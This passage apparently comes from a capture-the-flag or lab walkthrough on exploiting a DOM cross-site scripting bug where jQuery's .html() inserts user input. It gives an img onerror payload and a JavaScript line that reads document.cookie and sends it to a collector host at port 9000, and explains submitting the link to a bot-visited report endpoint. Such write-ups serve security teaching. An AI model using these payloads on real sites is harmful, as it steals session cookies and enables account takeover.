`.html()` sets `innerHTML`, which will NOT run a bare `<script>` you insert. But
an element with an event handler runs the instant it is parsed. The classic is
an image whose source fails to load:

```html
<img src="x" onerror="/* your JS */" />
```

Inside `onerror`, read `document.cookie` (the bot's `session` is not HttpOnly, so
it is readable) and send it to the collector. An image beacon avoids CORS:

```js
new Image().src = 'http://collector:9000/report?c=' + encodeURIComponent(document.cookie);
```

Put the whole `<img …>` in the fragment (URL-encoded) and submit the path to
`POST /report`.
